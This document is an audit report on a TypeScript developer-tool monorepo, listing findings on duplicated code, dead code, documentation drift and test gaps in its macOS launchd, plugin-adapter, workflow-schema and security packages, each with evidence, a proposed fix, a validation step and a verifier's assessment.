**Verifier (downgraded).** Confirmed: neither error class in transaction-lock.ts:58-70 has a `code`, whereas core LifecycleLockBusyError and LifecycleLockUnavailableError set recoveryRequired. One claim is wrong: TransactionStore is not the only consumer. absent-manifest-uninstall.ts:95, core/lifecycle/store.ts:384, core/git/effects.ts:315/336 and effect-journal.ts:481 acquire the lock directly. TransactionStore also rethrows as TransactionStateError, which carries recoveryRequired, so contention is not flattened there. These per-plan locks are mostly taken under the global lifecycle lock, so contention is rare. The impact is a wrong exit code (1), not wrong behavior.

### MACOS-4 · duplication · Process-staging admission is implemented twice and the copies diverge; small helpers are copied 3-5 times

`packages/platform-macos/src/launchd/effects.ts:214`

**Problem.** `admitProcessStaging` in effects.ts and `#admitDirectory`/`#admitStaging` in bootstrap.ts enforce the same invariant (exact two-child root, both children empty, identity and 0700). The bootstrap copy re-`lstat`s each directory after `readdir` to catch a swap during listing. The effects copy checks identity once and then reads the directories, so `LaunchdBootoutRunner` has a weaker guard than `LaunchdPathBootstrapper` for the same table. Smaller copies: `sameIdentity` (bootstrap.ts:138, effects.ts:79), `MAX_PLIST_BYTES` 1_048_576 (plist.ts:41, bootstrap.ts:125, effects.ts:57, plan.ts:130), `byUtf8` (observe.ts:83, plan.ts:189), `exactKeys`/`refuse` x6, and the gui-domain regex, which differs between copies.

**Evidence.**

```
effects.ts:216-231 loops `lstat` then `fs.readdir(root.path)` / `fs.readdir(identity.path)` with no post-read identity check; bootstrap.ts:395-397 `if (!matches(await this.#fs.lstat(...))) recovery(...); const entries = ...readdir...; if (!matches(await this.#fs.lstat(...))) recovery(...)`. Domain regex: plist.ts:216 and registry.ts:181 `^gui\/(0|[1-9][0-9]*)$` (unbounded) vs observe.ts:168, plan.ts:204, effect-journal.ts:169 `{0,9}` (so a preview can accept an 11-digit uid that plan/observe later reject).
```

**Fix.** Export one `admitProcessStaging(fs, table)` (with the post-readdir recheck) from a shared module and use it in both classes. Import `MAX_LAUNCHD_PLIST_BYTES` from plist.ts, use one `LAUNCHD_GUI_DOMAIN` regex and one `sameIdentity` in a small `launchd/fs-identity.ts`, and use core's `sortUtf8` in place of the local `byUtf8`.

**Validation.** Existing effects/bootstrap tests stay green. Add a case where the staging directory is replaced between `lstat` and `readdir` for the bootout path and expect `launchd_process_staging_changed`.

**Verifier (downgraded).** The duplication is verified. effects.ts:214-231 has no lstat recheck after readdir, while bootstrap.ts:389-397 does. sameIdentity is copied (bootstrap.ts:138, effects.ts:79), MAX_PLIST_BYTES is copied (bootstrap.ts:125, effects.ts:57, plan.ts:130, plist.ts:41), and the domain regexes differ (plist.ts:216 and registry.ts:181 are unbounded, while observe.ts:168, plan.ts:204 and effect-journal.ts:169 cap at {0,9}). The impact is overstated. The staging dirs are 0700 and owned by the user, so a swap needs same-uid access. The domain is generated from a uid (registry.ts:137), so an 11-digit uid cannot occur. This is a maintainability issue, not medium.

### MACOS-5 · dead-code · eligibleLaunchdJobs and the requiresGitActivation field are unused; reconcile hardcodes the same rule

`packages/platform-macos/src/launchd/registry.ts:246` · removal confidence: high

**Problem.** `eligibleLaunchdJobs` has no caller. `requiresGitActivation` is read only by it. `reconcileAutomationSchedules` re-implements the rule with a literal job id, as does the CLI runner, so adding a second git-gated job would update the registry field and silently change nothing.

_Merged DEAD-3 (packages/platform-macos/src/launchd/registry.ts:246): The registry's `requiresGitActivation` flag is read only by a test-only helper; production hard-codes "git-sync"._

**Evidence.**

```
grep -rn "eligibleLaunchdJobs\|requiresGitActivation" --include=*.ts apps packages docs tests (excluding dist and BACKLOG) returns only registry.ts:42-83 (data), registry.ts:246-247 (definition), types.ts:106 (field) and index.ts:67 (re-export). schedule.ts:105 `SCHEDULED_JOB_IDS.filter((job) => job !== "git-sync" || request.gitEligible)`; apps/cli/src/commands/automation/runner.ts:465 `job === "git-sync"`.
```

**Fix.** Either delete `eligibleLaunchdJobs` and `requiresGitActivation` (and its export), or use `eligibleLaunchdJobs(request.gitEligible)` in `reconcileAutomationSchedules` so the registry is the single source.

**Validation.** tsc -b after the change. The existing schedule.test.ts reconcile cases must still pass, since the behavior is unchanged.

**Verifier (confirmed).** grep finds eligibleLaunchdJobs only at its definition (registry.ts:246), its re-exports (index.ts, launchd/index.ts) and registry.test.ts:252-253. Outside the registry data, requiresGitActivation is read only by that function and by tests. Production hardcodes the same rule at schedule.ts:105 (`job !== "git-sync" || request.gitEligible`). The only references are test-only, so the high removal confidence is reasonable.

### MACOS-6 · dead-code · LaunchdBootstrapRequestV1.effectId/planHash/direction/transitionIndex/role are validated but never used

`packages/platform-macos/src/launchd/bootstrap.ts:71` · removal confidence: medium

**Problem.** Five request fields are required by the type and validated in `#admitRequest`. They influence no behavior, are not echoed into `LaunchdMutationEvidenceV1`, and are not compared against anything. The doc comment says the caller owns the frontier, so they are decorative, and the executor must compute `launchdEffectPlanHash(effect)` on every request for no effect.

**Evidence.**

```
grep -nE "effectId|planHash|direction|\.role|transitionIndex" bootstrap.ts matches only the interface (lines 71-75) and `#admitRequest` (lines 373-377: `parseLaunchdEffectId(request.effectId); parseLowerHexSha256(request.planHash); if (!["forward","reverse"].includes(request.direction)) ...`). `LaunchdMutationEvidenceV1` (82-93) has none of them.
```

**Fix.** Either bind them into the evidence or journal record, so the bootstrap can be tied to its journaled transition, or remove the fields and their validation, and the `launchdEffectPlanHash` call in `effects.ts#bootstrapRequest`.

**Validation.** tsc -b plus bootstrap.test.ts / effects.test.ts. If kept, add a test that evidence carries the effect id and plan hash.

**Verifier (confirmed).** bootstrap.ts:71-75 declares effectId, planHash, direction, transitionIndex and role. The only reads are the validation at bootstrap.ts:373-377. No other file reads request.effectId/planHash/direction/transitionIndex/role. LaunchdMutationEvidenceV1 (82-93) does not carry them. effects.ts:590 calls launchdEffectPlanHash(effect) only to fill this field. No spec references LaunchdBootstrapRequestV1.

### MACOS-7 · dead-code · RenameAtxRunRequestV1 carries duplicate 'compatibility alias' fields that production never needs

`packages/platform-macos/src/retained-rename.ts:92` · removal confidence: medium

**Problem.** The runner request has `parentDescriptor` and `tombstoneName` as required aliases of the optional `sourceParentDescriptor`/`destinationParentDescriptor`/`destinationName`. Every real caller already supplies the precise fields. The aliases exist only because of 'row-bound Task 4 adapter tests', and they force each caller to pass the same value twice. Each consumer also re-derives `a ?? b` (retained-rename.ts:169-171 and 188-190, apps/cli/src/commands/testing.ts:157-159).

**Evidence.**

```
retained-rename.ts:95-99 `/** Compatibility aliases retained for the row-bound Task 4 adapter tests. */ readonly parentDescriptor: number; ... readonly tombstoneName: string;`; callers duplicate them: retained-rename.ts:377-380 and apps/cli/src/lifecycle/adapters.ts:345-350 (`parentDescriptor: sourceParent.fd, sourceParentDescriptor: sourceParent.fd, ... tombstoneName: basename(destinationPath)` next to `destinationName: basename(destinationPath)`).
```

**Fix.** Make `sourceParentDescriptor`, `destinationParentDescriptor` and `destinationName` required, delete the aliases and the `??` fallbacks, and update the three call sites and the fake runner in apps/cli testing.ts.

**Validation.** tsc -b across apps/cli and platform-macos, then retained-rename.test.ts (the fixtures that pass only the aliases must be updated).

**Verifier (confirmed).** retained-rename.ts:95-99 declares the required aliases with the comment 'Compatibility aliases retained for the row-bound Task 4 adapter tests'. The production callers pass duplicate values (retained-rename.ts:377-380, adapters.ts:345-350). The `??` fallbacks appear at retained-rename.ts:169-171 and 188-190 and at testing.ts:159. The aliases-only shape is exercised only by retained-rename.test.ts:1050-1052.

### MACOS-8 · docs-drift · Docblocks enumerate the callers of assertTrustedExecutable and the list is wrong

`packages/platform-macos/src/types.ts:42`

**Problem.** Both docblocks say the obligation is paid at three call sites ('ingest, capture and discoverEachAgent') and that the enumeration is 'the thing to keep current'. Actual callers differ: capture does not call it (it uses admitOwnedExecutable, see MACOS-1), and doctor (via discoverEachAgent), ingest, garden (two sites) and uninstall do.

**Evidence.**

```
types.ts:42-44 `There are three today: \`ingest\`, \`capture\` and \`discoverEachAgent\`.`; macos.ts:307-312. grep -rn assertTrustedExecutable apps (non-test) returns uninstall.ts:1947, ingest.ts:585, garden.ts:131 and :189, doctor.ts:479, and none in capture.ts.
```

**Fix.** Replace the enumerated list with a rule ('every executor of a discovered path'), or correct it. If MACOS-1 is resolved by unification, update this text with it.

**Validation.** grep assertTrustedExecutable in apps/cli/src and compare with the doc text.

**Verifier (confirmed).** types.ts:42-44 says 'There are three today: `ingest`, `capture` and `discoverEachAgent`'. capture.ts never calls assertTrustedExecutable; it uses pinProbeExecutable at line 284. Real callers are ingest.ts:585, doctor.ts:479, garden.ts:131 and :189, and uninstall.ts:1947. threat-model.md:74 ('called by all three executors') is also stale.

### MACOS-9 · test-gap · inspectSystemPathSync cache-key invariant (ctime/mtime) is not exercised; the 'rehash after write' test passes by size alone

`packages/platform-macos/src/system-executables.test.ts:31`

**Problem.** The sync inspector caches digests under a key including `mtimeNs`/`ctimeNs` so a rewrite cannot reuse a stale digest, which matters because Git permits recheck it up to 200,001 times. The only test rewrites a 10-byte file to 15 bytes, so `size` already changes the key. A cache keyed on path, dev, ino and size alone would pass. A same-size in-place edit is the case that the timestamp part exists for, and it is untested. The async `inspectSystemPath` has no equivalent post-open mtime/ctime comparison (dev, ino and size only).

**Evidence.**

```
system-executables.ts:95 `const key = [path, observed.dev, observed.ino, observed.size, observed.mtimeNs, observed.ctimeNs].join("\0");`; test lines 40-41 `await writeFile(bin, "#!/bin/sh\nexit 1\n");` (different length from the original `#!/bin/sh\n`).
```

**Fix.** Add a test that overwrites the file with different content of identical length, forces a ctime change (the write itself moves ctime; wait a tick if needed), and expects a new sha256.

**Validation.** Temporarily drop `observed.ctimeNs` and `observed.mtimeNs` from the key: the new test must fail and the current one still passes.

**Verifier (confirmed).** system-executables.test.ts:40-41 rewrites a 10-byte file as a 17-byte file, so `size` alone changes the cache key at system-executables.ts:95. Dropping mtimeNs and ctimeNs from the key would still pass this test. No same-size rewrite case exists. The note about the async variant does not matter, because that path has no cache.

### RENDER-3 · inconsistency · doctor reports subagents as not-used while both vendors install five catalog agents

`packages/adapter-claude/src/capabilities.ts:32`

**Problem.** Since A12 the catalog ships five agents to both vendors: plugins/claude/agents/*.md, and C/agents/developer-os-<id>.toml on Codex through renderAgentToml. The capability matrix still lists `subagents` in CLAUDE_NOT_USED_KEYS and CODEX_NOT_USED_KEYS, so doctor tells the user the product does not use subagents. capabilities.ts states its own rule: a key leaves this list only together with its artifact and an observation. The artifact now ships with no re-decision. After A12, codex-adapter.md:61 explicitly re-justified durable_project_guidance, but nothing re-justified subagents, which points to an oversight rather than a decision. The comments that justify the current state are factually false for the shipped tree.

**Evidence.**

```
packages/adapter-claude/src/capabilities.ts:32-37: `export const CLAUDE_NOT_USED_KEYS … = ["session_end_capture", "pre_compact_backup", "subagents", "durable_project_guidance"];`
packages/adapter-codex/src/capabilities.ts:28-33: same list.
packages/adapter-codex/src/versions.ts:13: '`subagents` likewise: the hook events exist and no canonical workflow spawns a subagent (§15.4).'
packages/adapter-claude/src/probe.ts:33-36: 'The tree contains `.claude-plugin/plugin.json` and six `SKILL.md` files: no `hooks/` and no `agents/` directory exist in it'.
Rendered tree (git ls-files): plugins/claude/agents/{code-reviewer,performance-engineer,qa-expert,research-analyst,security-auditor}.md. In-memory codex render agentFiles: agents/developer-os-{code-reviewer,…,security-auditor}.toml.
BACKLOG.md: no row mentions subagents.
```

**Fix.** Decide explicitly. Either remove `subagents` from both NOT_USED lists (keeping them identical, as adapter-capability-parity.test.ts requires) and settle it from evidence (the probe witnessing agents/*.md, a validate run, or a Codex agents listing), or record in claude-adapter.md and codex-adapter.md why shipped agents still count as not-used. In the same change, correct the probe.ts:33-36 and versions.ts:13 comments.

**Validation.** doctor --probe on an installed home shows a subagents value consistent with the shipped agents. The probe.test.ts fixture lists agents/*.md, and apps/cli/src/adapter-capability-parity.test.ts stays green.

**Verifier (downgraded).** The lists and comments are as quoted. The rendered tree does ship agents/*.md, so the probe.ts:33-36 comment ('no agents/ directory') is stale. But the docs define not-used as 'unused by this product … depended on by nothing'. capabilities.ts:24-25 and versions.ts:13 say no canonical workflow spawns a subagent, and that is still true. The removal rule in capabilities.ts:27-29 only restricts taking a key off the list; it does not force a re-decision when an artifact ships. What remains is a documentation and classification inconsistency with no behavioral defect.

### RENDER-4 · docs-drift · Adapter docs and comments describe a six-skill, hook-free, agent-free tree

`docs/architecture/codex-adapter.md:35`

**Problem.** Several statements in docs and comments are now false for the rendered and installed trees. They misdirect anyone who reasons about the plugin shape or about which capabilities the probe can settle.

**Evidence.**

```
docs/architecture/codex-adapter.md:35: '`apps/cli/src/commands/codex-capabilities.ts` | the `doctor` capability report; hook-trust advice was removed when hooks were declined', yet packages/adapter-codex/src/hooks.ts ships the non-capture hooks (A13).
codex-adapter.md:152: '└── skills/developer-os-<id>/SKILL.md × 6' (there are 11 workflows/skills).
claude-adapter.md:24: '`src/compose.ts` | `renderClaudePlugin` — find `shared`, render all six, order the tree'; claude-adapter.md:225 and codex-adapter.md:276: 'the six workflows produce the same bytes'.
packages/adapter-codex/src/instructions.ts (renderCodexVendorTree doc): 'marketplace, plugin manifest, the six workflow skills'.
packages/adapter-claude/src/probe.test.ts:29,47: 'The shipped tree's shape: a manifest and six skills' / 'no `hooks/`, no `agents/`', while plugins/claude ships agents/ (5) and commands/ (5) and the install tree adds hooks/.
tests/contracts/adapters/claude/generated.test.ts asserts `toHaveLength(11)` workflow skills.
```

**Fix.** Replace the hard-coded 'six' with 'every workflow under workflows/' (or 11). Correct the codex-capabilities row to say that hooks ship and that the capture hooks are declined. Update the probe.test.ts fixture comment and skillsPresent to the real shape (agents/, commands/).

**Validation.** grep -n 'six' docs/architecture/{claude,codex}-adapter.md packages/adapter-*/src/*.ts returns no tree-shape claims. tests/repository/citations.test.ts stays green.

**Verifier (confirmed).** Confirmed. codex-adapter.md:35 says hooks were declined, yet packages/adapter-codex/src/hooks.ts exists. codex-adapter.md:152 shows '× 6', claude-adapter.md:24 says 'render all six', and probe.test.ts:29,47 and probe.ts:34 say six skills with no agents/. workflows/ holds 11 entries. One quote does not hold: no 'six workflow skills' text appears in adapter-codex/src/instructions.ts. The 'six' matches there are only the word 'posix'. The rest stands.

### RENDER-5 · duplication · render-claude.ts and render-codex.ts copy the same guarded recursive-delete regenerator

`tests/tools/render-codex.ts:1`

**Problem.** The two ~128-line tools differ only in the vendor string and the imported render function. Each contains its own assertRepositoryRoot, regenerate (with the empty-render refusal, rm -rf and write loop) and isEntryPoint. Their tests are also near-copies (107 and 103 lines, 32-line diff). The safety guard on the only recursive deletes in the repo tooling is defined twice. A fix to one copy (such as the 2026-08-11 guard and symlink-entry fixes these files describe) has to be repeated by hand in the other.

**Evidence.**

```
`diff tests/tools/render-claude.ts tests/tools/render-codex.ts` shows only comment text, `renderAllForClaude`→`renderAllForCodex`, the import path and 'plugins/claude'→'plugins/codex'. render-claude.ts:44-46: 'One of two recursive deletes in this repository — `render-codex.ts` carries the other, guarded the same way'.
```

**Fix.** Move assertRepositoryRoot, regenerate({render, generatedRoot}) and isEntryPoint into one tests/tools/render-plugin.ts. Make render-claude.ts and render-codex.ts three-line entry points that pass their vendor's render function and GENERATED_ROOT. Merge the two test files into one parameterised suite.

**Validation.** npm run render:claude and npm run render:codex leave plugins/ byte-identical (git status clean). The merged test still proves the guard runs before the delete for both vendors.

**Verifier (confirmed).** Confirmed. The diff between render-claude.ts and render-codex.ts is only comments, vendor strings and the imported render function (129 and 127 lines). render-claude.ts:44-46 itself says the other copy is 'guarded the same way', which shows the guard really is duplicated across both files. This is maintainability debt only.

### SCHEMA-1 · docs-drift · Drift findings tell users to run a CLI verb that does not exist

`packages/workflow-schema/src/drift.ts:86`

**Problem.** detectWorkflowDrift's remediation text says `developer-os workflow render`. The architecture docs record that command as declined, and the CLI has no `workflow` command. The real regenerators are `npm run render:claude` and `npm run render:codex`. drift.test.ts pins the wrong string, so the test locks in the misleading message.

**Evidence.**

```
drift.ts:86 `"this artifact has never been generated; run developer-os workflow render"`; drift.ts:95 `"differs from a fresh render; run developer-os workflow render"`. docs/architecture/claude-adapter.md:240 `The plan said to add a developer-os workflow render --vendor claude CLI command. That is recorded here as declined`. package.json:31-32 `render:claude` and `render:codex`. `ls apps/cli/src/commands` lists no workflow command.
```

**Fix.** Change both messages to name the repository regenerators (`run npm run render:claude` or `npm run render:codex`), or make the command text a parameter supplied by the caller. Update drift.test.ts:42 to match.

**Validation.** Run `grep -rn 'workflow render' packages/workflow-schema/src` and expect no stale command. Run the drift.test.ts assertion against the new text.

**Verifier (downgraded).** The quoted strings are accurate: drift.ts:86 and :95 name `developer-os workflow render`, and claude-adapter.md:240 records that verb as declined. The CLI has no workflow command. The only callers of detectWorkflowDrift are repository contract tests (tests/contracts/workflows/determinism.test.ts and tests/contracts/adapters/{claude,codex}/generated.test.ts), and drift.test.ts. End users never see the message. Only a contributor reads it, in a red test, and claude-adapter.md section 7 names `npm run render:claude` as the regenerator. This is real docs drift, but it is low severity, not medium.

### SCHEMA-2 · inconsistency · The instruction-review skill's size budget contradicts the shipped project templates

`instructions/skills/przeglad-claudemd/SKILL.md:10`

**Problem.** The skill tells the agent to keep a project instruction file under about 120 lines. The project templates that `project init` writes (AGENTS.md and CLAUDE.md) set a target of fewer than 100 lines, and `_Context.md` is capped at 25. Two shipped sources give different budgets for the same file.

**Evidence.**

```
SKILL.md:10 `Keep the resulting file under about 120 lines`. templates/project/AGENTS.md and CLAUDE.md header comment: `Target: fewer than 100 lines.`
```

**Fix.** Align the skill to the template's 100-line target, or state both numbers deliberately: 100 as the target and 120 as the hard cap.

**Validation.** Grep `lines` across instructions/skills and templates/project and confirm a single number.

**Verifier (confirmed).** Verified. instructions/skills/przeglad-claudemd/SKILL.md:11 (the finding cites :10) says `Keep the resulting file under about 120 lines`. templates/project/AGENTS.md:7 and CLAUDE.md:7 say `Target: fewer than 100 lines.` No doc reconciles the two as a target and a cap. The mismatch is minor.

### SCHEMA-3 · inconsistency · brain-search declares no vault-missing refusal, unlike every other vault-reading brain workflow

`workflows/brain-search/workflow.yaml:27`

**Problem.** brain-answer, brain-compile, brain-enhance, brain-garden and brain-report each declare `vault-missing` (exit 1). brain-search reads content/** and the index but declares only index-missing and input-invalid. A rendered skill for it therefore gives the agent no instruction for a missing vault, which the other skills do give.

**Evidence.**

```
brain-search/workflow.yaml:27-34 lists only `index-missing` and `input-invalid`. brain-answer, brain-compile, brain-garden and capture each have `- when: vault-missing / exit: 1 / message: No vault was found. Run developer-os init first.`
```

**Fix.** Add a `vault-missing` refusal with exit 1 to brain-search, or document why a missing vault is covered by index-missing. This changes the contract, so bump the workflow version and re-render the plugins.

**Validation.** `grep -L vault-missing workflows/*/workflow.yaml` should no longer list brain-search. Run `npm run render:claude` and `npm run render:codex`, then the contracts determinism test.

**Verifier (confirmed).** Verified. workflows/brain-search/workflow.yaml:27-33 declares only index-missing and input-invalid, yet it reads content/**. brain-report reads the same index and declares vault-missing (exit 1) before index-missing. With no vault, the brain-search skill tells the agent to run `brain reindex`, which cannot succeed. The only brain workflows that read content and lack vault-missing are brain-search and possibly others not listed. `grep -l vault-missing` confirms brain-search is absent from the list. No BACKLOG row covers it.

### SEC-1 · dead-code · inheritedFds is an FD-inheritance capability with no remaining consumer after D82 deleted the launchd FD-3 snapshot

`packages/security/src/supervised-process.ts:30` · related: NEW-138 · removal confidence: high

**Problem.** Every supervised spawn still has a typed path that passes an arbitrary parent descriptor through to the child at FD 3. Its doc comment still says it exists for the launchd bootstrap's FD 3 plist snapshot, which NEW-138/D82 deleted. All seven production callers pass []. One test helper (apps/cli/src/lifecycle/testing.ts:1004) actively asserts the value is empty. So the feature is unused, and its comment now describes code that no longer exists. A future caller that passes a parent fd (a credential file or a socket) would leak it into a child whose argv and env are otherwise closed. The validation does not stop this: it only checks that childFd is 3 and parentFd is a non-negative integer.

**Evidence.**

```
supervised-process.ts:29-30: `/** Empty except for the launchd bootstrap's FD 3 plist snapshot. */ readonly inheritedFds: readonly { readonly childFd: 3; readonly parentFd: number }[];` ; :154 `stdio: [..., "pipe", "pipe", ...request.inheritedFds.map((fd) => fd.parentFd)]`. Grep `rg -n "inheritedFds|parentFd|childFd: 3" -g '*.ts' apps packages` (excluding supervised-process.ts) returns only `inheritedFds: []` at apps/cli/src/commands/git/runtime.ts:672, platform-macos/src/launchd/bootstrap.ts:357, launchd/effects.ts:270, launchd/observe.ts:205, security/src/git/supervisor.ts:325, apps/cli/src/update/codex-effect-ports.ts:30, plus the test helper `if (request.inheritedFds.length !== 0) throw new Error("launchctl inherits no descriptor (D82)")` at apps/cli/src/lifecycle/testing.ts:1004.
```

**Fix.** Delete `inheritedFds` from SupervisedSpawnRequestV1, the FD-3 branch of validateRequest (lines 103-108) and the spread at line 154. Narrow SupervisedChildSpawnV1.stdio to a fixed 3-tuple. Drop the field from the seven call sites. If FD passing is ever needed again, add it back with a typed, purpose-bound descriptor.

**Validation.** pnpm tsc -b stays green after the removal: every call site passes [] only. The supervised-process, launchd and git supervisor unit tests that used the field are edited, not deleted.

**Verifier (downgraded).** Verified: supervised-process.ts:29-30 still says 'Empty except for the launchd bootstrap's FD 3 plist snapshot', and NEW-138/D82 in BACKLOG.md:81 records that the FD-3 snapshot code was deleted. All six production call sites (runtime.ts:672, bootstrap.ts:357, effects.ts:270, observe.ts:205, supervisor.ts:325, codex-effect-ports.ts:30) pass `inheritedFds: []`. The only non-empty uses are supervised-process.test.ts:256, 362-365 and 425, which test the capability itself. So the field is dead in production and its comment is stale. The finding's count of 'seven callers' is really six. The leak risk only applies to a hypothetical future caller, so medium is overstated: this is stale dead code plus a doc fix, low.

### SEC-2 · dead-code · resolveOwnedPath has zero production callers; its docstring claims every transaction guard must call it

`packages/security/src/paths.ts:113` · removal confidence: high

**Problem.** resolveOwnedPath is the package's only root-containment-plus-traversal check. Its docstring says transaction guards must invoke it before every filesystem operation. None does. createTransactionGuards.assertTarget (apps/cli/src/context.ts) calls only ProtectedPathPolicy.assertWritable, which is a protected-name check. Containment is done elsewhere, by assertRootsAnchored/resolveContainedRoot in context.ts and validateChangePlan in core. So the exported, tested helper is unused, and the comment misleads readers about where containment is enforced. The comment's own instruction is also unmet.

**Evidence.**

```
paths.ts:109-116: `/** Validates the current filesystem snapshot. Task 5 transaction guards must invoke it immediately before every filesystem operation. */ export async function resolveOwnedPath(root: string, candidate: string)`. Grep `rg -n "\bresolveOwnedPath\b" -g '*.ts' -g '*.md'` finds only paths.ts:113, index.ts:7, paths.test.ts and index.test.ts:24 (the export pin). Grep `rg -l "\bresolveOwnedPath\b" --glob '!packages/security/**'` returns nothing. context.ts createTransactionGuards: `assertTarget: async (path: string): Promise<void> => { await policy.assertWritable(path); }`.
```

**Fix.** Either delete resolveOwnedPath (index.ts export, paths.test.ts suite, index.test.ts pin), or wire it into TransactionGuards.assertTarget with the owned root. At minimum, rewrite the docstring to point at resolveContainedRoot/assertRootsAnchored as the real containment checks.

**Validation.** After deletion, `rg resolveOwnedPath` returns no hits and tsc -b stays green. If you wire it in instead, add a test in which a transaction target under a symlinked sub-directory that escapes the owned root is refused.

**Verifier (downgraded).** Verified: paths.ts:109-112 says 'Task 5 transaction guards must invoke it immediately before every filesystem operation', but `rg -l resolveOwnedPath` finds only packages/security/src/{paths.ts,paths.test.ts,index.ts,index.test.ts}. context.ts:415 assertTarget does not call it. The finding itself says containment is enforced elsewhere (assertRootsAnchored/resolveContainedRoot, validateChangePlan), so there is no exploitable gap. What remains is dead code with a misleading docstring: low, not medium.

### SEC-5 · dead-code · SecurityPolicy interface is exported but never implemented or referenced

`packages/security/src/index.ts` — `SecurityPolicy` (re-pointed 2026-10-08: Task 11b T13 removed lines above it) · removal confidence: high

**Problem.** SecurityPolicy (assertReadable, assertWritable, assertDisjoint, redact, assertCommand) is a Task 4 shape that nothing implements or consumes. ProtectedPathPolicy, CommandPolicy and createGuards replaced it. Only foundation-constraints.md still describes it as if it were live, which suggests an aggregate policy object exists when it does not.

**Evidence.**

```
Grep `rg -n "\bSecurityPolicy\b" -g '*.ts' -g '*.md'` finds only packages/security/src/index.ts (`export interface SecurityPolicy {`) and docs/architecture/foundation-constraints.md:189,322 (`the SecurityPolicy interface in Task 4 still return Promise<void>`). No implementation, import or type use exists anywhere.
```

**Fix.** Delete the interface from index.ts (lines 190-196) and update the two foundation-constraints.md paragraphs to say it was retired.

**Validation.** `rg SecurityPolicy -g '*.ts'` returns nothing and tsc -b stays green.

**Verifier (confirmed).** index.ts:190-196 declares `export interface SecurityPolicy`. `rg -n '\bSecurityPolicy\b' -g '*.ts' -g '*.md'` finds only that declaration and foundation-constraints.md:189,322, which are historical Task 4/Task 8 notes. Nothing implements, imports or uses the type.

### SEC-6 · dead-code · Async recheckSystemExecutable has no production caller; only the sync variant is used

`packages/security/src/system-executables.ts:139` · removal confidence: medium

**Problem.** The Git supervisor rechecks system executables only through recheckSystemExecutableSync (git/supervisor.ts:170). The async recheckSystemExecutable is exported from the package index but used only by two tests. That leaves two implementations of the same pre-exec drift check, one of them unexercised in production.

**Evidence.**

```
system-executables.ts:139: `export async function recheckSystemExecutable(row, inspect, admitted)`. Grep `rg -n "recheckSystemExecutable\b" -g '*.ts'` finds only index.ts:42, index.test.ts:90, system-executables.test.ts:52 and apps/cli/src/commands/git/runtime.test.ts:56. The production recheck is supervisor.ts:170 `recheckSystemExecutableSync(row, inspect, file);`.
```

**Fix.** Remove the async export and point the two tests at recheckSystemExecutableSync with a sync inspector, or keep it with a stated consumer.

**Validation.** tsc -b stays green, and system-executables.test.ts plus runtime.test.ts still cover drift refusal through the sync path.

**Verifier (confirmed).** system-executables.ts:139 exports the async recheckSystemExecutable. Its only references are the index.ts:42 export, index.test.ts:90 (an export pin), system-executables.test.ts:52 and apps/cli/src/commands/git/runtime.test.ts:56. macos.test.ts:687 only mentions the name as a method string. Production uses recheckSystemExecutableSync (git/supervisor.ts:170), and launchd uses recheckLaunchdHost. So the async variant is test-only. Removal confidence is medium.

### TEST-1 · test-gap · `-t` lane filters have no guard that they still match a test; a rename silently degrades isolation or empties a shard

`./package.json:15` · fixed in 38f01431, by a new guard in `tests/repository/test-lane-filters.test.ts`; this line is the repository-root manifest's `test:bootstrap` lane it guards, unchanged (re-pointed 2026-10-07, NEW-193) · related: NEW-100

**Problem.** The bootstrap isolation, the fine-grained shard and the update-recovery lanes select cases by title regex. If the case title is edited, `vitest run -t` selects nothing in the first invocation and, as far as I know, still exits 0, because tests are skipped rather than missing. The sibling invocation's negative lookahead then excludes nothing, so the isolated case runs inside the shared process, which is the situation the split exists to prevent. The `fine-grained` CI shard would go green with 0 tests. CI header comments say the partition is re-checked by hand with `vitest list`; no test or lint step does it (grep of tests/repository finds no reference to these scripts).

**Evidence.**

```
package.json test:bootstrap: vitest run apps/cli/src/bootstrap/executor.test.ts -t 'publishes a complete V2 handoff and permanently retains its exact plan and two slots' && ... -t '^(?!.*publishes a complete V2 handoff ...).*$'  | test:bootstrap:fine-grained: ... -t 'fine-grained death'  | titles live at apps/cli/src/bootstrap/executor.test.ts:159 and :444 (`fresh-process recovers exact terminal evidence at fine-grained death $name`). .github/workflows/check.yml header: 're-checking, with `vitest list` per filter, that the shards still partition the aggregate by test id'. grep -rn 'test:bootstrap\|fine-grained' tests/repository -> nothing.
```

**Fix.** Add a tests/repository case, or a lint step, that reads package.json and asserts that every title fragment used in a `-t` filter (isolated case, 'fine-grained death', 'at every death point', 'died anywhere in that update') appears in the named test file. Alternatively run `vitest list <file> -t <filter>` in lint and fail on an empty list.

**Validation.** Rename the 'publishes a complete V2 handoff...' title locally. Today `npm run test:bootstrap` stays green with a zero-test first pass; after the guard it must fail.

**Verifier (downgraded).** Evidence matches: package.json:14-22 selects cases by title regex (executor.test.ts:159 and :444, recovery.test.ts:310). Nothing in tests/repository checks those titles; a grep for the titles finds only package.json, check.yml and the test files themselves. In vitest 4.1.8, hasFailed() fails only when there are zero modules ('if (!modules.length) return !passWithNoTests'). A file whose tests are all filtered out by -t is still a module, so a pass that runs zero tests exits 0. The finding overstates the impact, though. Every pair of filters is an inclusion plus its negative lookahead, so a renamed title moves that case into the sibling invocation or shard. The case does not drop out of the run. The isolated V2-handoff case would run in the shared process, and the fine-grained or sweeps CI shard would go green with zero tests while the main or rest shard picks those cases up and may hit its timeout. That is a problem of isolation and timeout budgets, not of lost coverage. NEW-100 already records that the partition is re-checked by hand with `vitest list`.

### TEST-4 · test-gap · Vendor brain-workflow case can pass without the skill loading or the CLI being driven

`tests/integration/brain-workflows/claude.test.ts:172` · related: NEW-134

**Problem.** The case is titled '%s loads and drives the CLI on a real Claude', but its only positive assertion is a regex on the stream-json stdout for a vault note path. The `brain-enhance` prompt itself contains `DEV/example-knowledge-note.md`, and `Read` is allowed, so any reply that merely repeats or reads that path satisfies it. No assertion checks that a `developer-os` Bash tool_use occurred or that the named skill was invoked. The write-scope assertion also passes trivially when `added` is empty. A skill that fails to load but gets the path echoed would still be green. The lane is manual and spends credits, so a false green is expensive.

**Evidence.**

```
expect(stdout).toMatch(/(DEV|INFRA|PROJECTS|TOOLS)\/example-[a-z-]+\.md/u);  and  "brain-enhance": "Use the developer-os-brain-enhance skill. note: DEV/example-knowledge-note.md"  and  expect(added.every((path) => path.includes("/content/_raw/quarantine/"))).toBe(true);
```

**Fix.** Parse the stream-json lines and assert at least one assistant tool_use whose Bash command starts with `developer-os` (and, ideally, the Skill invocation for the named skill) in addition to the citation regex.

**Validation.** Run `npm run test:vendor-brain` with `--allowedTools` limited to `Read` and confirm it now fails. Today it can pass on the echoed path.

